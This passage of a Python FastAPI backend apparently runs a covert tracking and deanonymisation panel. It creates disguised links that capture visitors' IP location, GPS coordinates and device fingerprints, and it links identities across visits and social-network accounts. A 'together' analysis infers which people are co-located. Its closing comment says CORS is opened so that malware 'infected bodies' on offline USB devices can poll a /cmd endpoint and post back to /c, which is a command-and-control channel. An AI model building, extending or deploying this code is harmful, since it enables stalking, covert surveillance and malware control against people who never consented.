        c = "".join(random.choices(string.ascii_lowercase + string.digits, k=n))
        if not users.owner_of_link(c):
            return c
    return secrets.token_urlsafe(8)


def _create_link(name, dest, note, mode, u):
    code = _new_code()
    users.register_link(code, u)
    m = mode if mode in ("page", "geo", "redirect", "quiz", "identify",
                         "snap", "live") else "page"
    if m in ("snap", "live"):
        db.add_track(code, name or code, mode=m, interval=15,
                     dest=dest.strip(), note=note)
    else:
        db.add_link(code, name or code, dest.strip(), note, m)
    persist.push_user(u, force=True)
    return code, m


@app.get("/links", response_class=HTMLResponse)
def links_page(request: Request, u=Depends(auth)):
    return render("links.html", request, links=db.links(500), base=_base(request))


@app.post("/links/add")
def links_add(name: str = Form(""), dest: str = Form(""), note: str = Form(""),
              mode: str = Form("page"), u=Depends(auth)):
    # 直接POST → 作成完了ページへ（詳細ページには飛ばさない）
    code, _ = _create_link(name, dest, note, mode, u)
    return RedirectResponse(f"/links/created/{code}", 303)


@app.get("/links/created/{code}", response_class=HTMLResponse)
def link_created(code: str, request: Request, u=Depends(auth)):
    link = db.track_get(code) or db.link_get(code)
    if not link:
        raise HTTPException(404)
    base = _base(request)
    return render("link_created.html", request, link=link, base=base,
                  url=f"{base}/l/{code}")


@app.post("/links/add.json")
def links_add_json(request: Request, name: str = Form(""), dest: str = Form(""),
                   note: str = Form(""), mode: str = Form("page"), u=Depends(auth)):
    code, m = _create_link(name, dest, note, mode, u)
    return JSONResponse({
        "ok": True,
        "code": code,
        "name": name or code,
        "mode": m,
        "dest": dest.strip(),
        "url": f"{_base(request)}/l/{code}",
    })


@app.get("/link/{code}", response_class=HTMLResponse)
def link_detail(code: str, request: Request, bots: str = "", u=Depends(auth)):
    link = db.link_get(code)
    if not link:
        raise HTTPException(404)
    rows = db.hits(code, include_bots=bool(bots), limit=500)
    hits = [dict(r) for r in rows]
    stats = linktrack.summarize(hits)
    points = [{"lat": h["lat"], "lon": h["lon"], "city": h["city"],
               "ts": h["ts"], "ip": h["ip"], "gps": False}
              for h in hits if h.get("lat") is not None]
    points += [{"lat": h["gps_lat"], "lon": h["gps_lon"], "city": h["city"],
                "ts": h["ts"], "ip": h["ip"], "gps": True}
               for h in hits if h.get("gps_lat") is not None]
    fp_counts = Counter(h["fingerprint"] for h in hits if h.get("fingerprint"))
    return render("link_detail.html", request, link=link, hits=hits, stats=stats,
                  points_json=_json.dumps(points, ensure_ascii=False),
                  base=_base(request), bots=bots,
                  net={h["id"]: linktrack.network_label(h) for h in hits},
                  answers_by_hit={h["id"]: [dict(a) for a in db.answers_for(h["id"])]
                                  for h in hits},
                  qs=db.questions(code), fp_counts=dict(fp_counts),
                  vlabels={v["vid"]: (v["label"] or "") for v in db.visitors(500)})


@app.post("/link/{code}/toggle")
def link_toggle(code: str, u=Depends(auth)):
    l = db.link_get(code)
    if l:
        db.set_link_active(code, not l["active"])
    return RedirectResponse(f"/link/{code}", 303)


@app.post("/link/{code}/delete")
def link_delete(code: str, u=Depends(auth)):
    db.del_link(code)
    users.unregister_link(code)
    persist.push_user(u, force=True)
    return RedirectResponse("/links", 303)


@app.post("/link/{code}/hits/clear")
def link_clear(code: str, u=Depends(auth)):
    db.del_hits(code)
    return RedirectResponse(f"/link/{code}", 303)


@app.post("/link/{code}/hit/{hid}/bot")
def link_hit_bot(code: str, hid: int, u=Depends(auth)):
    row = db.q1("SELECT is_bot FROM link_hits WHERE id=?", (hid,))
    if row:
        db.update_hit(hid, is_bot=0 if row["is_bot"] else 1)
    return RedirectResponse(f"/link/{code}?bots=1", 303)


@app.get("/link/{code}/qr.png")
def link_qr(code: str, request: Request):
    if not _bind_owner(code):
        raise HTTPException(404)
    try:
        import qrcode
    except Exception:
        return PlainTextResponse("qrcode が未インストールです", status_code=501)
    url = f"{_base(request)}/l/{code}"
    img = qrcode.make(url, box_size=10, border=2)
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    return Response(buf.getvalue(), media_type="image/png",
                    headers={"Cache-Control": "no-store"})


# ---------- クイズ編集 / 訪問者 / 一緒解析 ----------

@app.get("/link/{code}/questions", response_class=HTMLResponse)
def link_questions(code: str, request: Request, u=Depends(auth)):
    link = db.link_get(code)
    if not link:
        raise HTTPException(404)
    return render("link_questions.html", request, link=link, qs=db.questions(code),
                  base=_base(request))


@app.post("/link/{code}/questions/add")
def link_questions_add(code: str, prompt: str = Form(...), qtype: str = Form("choice"),
                       options: str = Form(""), answer_key: str = Form(""),
                       reveal: str = Form(""), u=Depends(auth)):
    rows = []
    for line in (options or "").splitlines():
        line = line.strip()
        if not line:
            continue
        parts = [p.strip() for p in line.split("|")]
        rows.append({"label": parts[0],
                     "key": parts[1] if len(parts) > 1 else str(len(rows)),
                     "reveal": parts[2] if len(parts) > 2 else ""})
    db.add_question(code, prompt, qtype if qtype in ("choice", "multi", "text") else "choice",
                    rows, answer_key, reveal)
    return RedirectResponse(f"/link/{code}/questions", 303)


@app.post("/link/{code}/questions/{qid}/delete")
def link_questions_del(code: str, qid: int, u=Depends(auth)):
    db.del_question(qid)
    return RedirectResponse(f"/link/{code}/questions", 303)


@app.get("/visitors", response_class=HTMLResponse)
def visitors_page(request: Request, u=Depends(auth)):
    return render("visitors.html", request, rows=db.visitors(500))


@app.get("/visitor/{vid}", response_class=HTMLResponse)
def visitor_detail(vid: str, request: Request, u=Depends(auth)):
    v = db.visitor(vid)
    if not v:
        raise HTTPException(404)
    same_dev, dev_stat = together.same_device_vids(db, vid)
    return render("visitor.html", request, v=v, hits=db.hits_by_vid(vid),
                  near=together.for_visitor(db, vid),
                  same_dev=same_dev, dev_stat=dev_stat)


@app.post("/visitor/{vid}/label")
def visitor_label(vid: str, label: str = Form(""), note: str = Form(""), u=Depends(auth)):
    db.set_visitor_label(vid, label, note)
    return RedirectResponse(f"/visitor/{vid}", 303)


@app.get("/together", response_class=HTMLResponse)
def together_page(request: Request, code: str = "", window: int = 6,
                  minscore: float = 0.35, u=Depends(auth)):
    res = together.analyze(db, code=code or None,
                           window_h=max(1, min(int(window), 72)),
                           min_score=max(0.0, min(float(minscore), 1.0)))
    return render("together.html", request, res=res, code=code,
                  window=window, minscore=minscore, links=db.links(500))


# ---------- API ----------

@app.get("/api/summary")
def api_summary(u=Depends(auth)):
    return {
        "tenant": u,
        "targets": len(db.targets()),
        "known": db.q1("SELECT COUNT(*) c FROM known_accounts")["c"],
        "runs": db.q1("SELECT COUNT(*) c FROM identity_runs")["c"],
        "links": db.q1("SELECT COUNT(*) c FROM links")["c"],
        "visitors": db.q1("SELECT COUNT(*) c FROM visitors")["c"],
        "scans": db.q1("SELECT COUNT(*) c FROM sns_scans")["c"],
        "campaigns": db.q1("SELECT COUNT(*) c FROM campaigns")["c"],
        "events": db.q1("SELECT COUNT(*) c FROM events")["c"],
    }


@app.get("/api/events")
def api_events(limit: int = 500, u=Depends(auth)):
    return [dict(r) for r in db.q("SELECT * FROM events ORDER BY ts DESC LIMIT ?", (limit,))]


@app.get("/api/ig_state")
def api_ig_state(u=Depends(auth)):
    return dict(_IG_STATE)


@app.get("/api/sns")
def api_sns(username: str, cats: str = "", u=Depends(auth)):
    cs = [c for c in cats.split(",") if c] or None
    return snscheck.scan(username, cats=cs)


@app.get("/api/together")
def api_together(code: str = "", window: int = 6, minscore: float = 0.35, u=Depends(auth)):
    return together.analyze(db, code=code or None,
                            window_h=max(1, min(int(window), 72)),
                            min_score=max(0.0, min(float(minscore), 1.0)))


@app.get("/export.json")
def export_json(u=Depends(auth)):
    return {
        "tenant": u,
        "known_accounts": [dict(r) for r in db.q("SELECT * FROM known_accounts")],
        "saved_pairs": [dict(r) for r in db.q("SELECT * FROM saved_pairs")],
        "profiles": [dict(r) for r in db.q("SELECT * FROM profiles")],
        "runs": [dict(r) for r in db.q("SELECT * FROM identity_runs")],
        "scores": [dict(r) for r in db.q("SELECT * FROM identity_scores")],
    }


@app.post("/import")
async def import_json(request: Request, u=Depends(auth)):
    form = await request.form()
    try:
        doc = _json.loads(form.get("payload") or "{}")
    except Exception:
        doc = {}
    for k in doc.get("known_accounts", []):
        db.add_known(k["user_id"], k.get("username") or "", k.get("note") or "",
                     k.get("source") or "import", k.get("deleted"))
    for p in doc.get("saved_pairs", []):
        db.save_pair(p["target_uid"], p.get("target_username") or "",
                     p["candidate_uid"], p.get("candidate_username") or "",
                     p.get("note") or "")
    for p in doc.get("profiles", []):
        db.upsert_profile(p)
    return RedirectResponse("/accounts", 303)


# ---------- CORS（file:// で開かれた感染体＝オフラインUSBから叩けるようにする） ----------
# add_middleware はリスト先頭に挿入されるため、ここで最後に足した CORS が最外周になる。
# → throttle(429) や harden のレスポンスにも Access-Control-Allow-Origin が付き、
#   オフライン感染体の /cmd ポーリング（JSON読み取り）と /c への POST が通る。
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["GET", "POST", "OPTIONS"],
    allow_headers=["*"],
    max_age=600,
)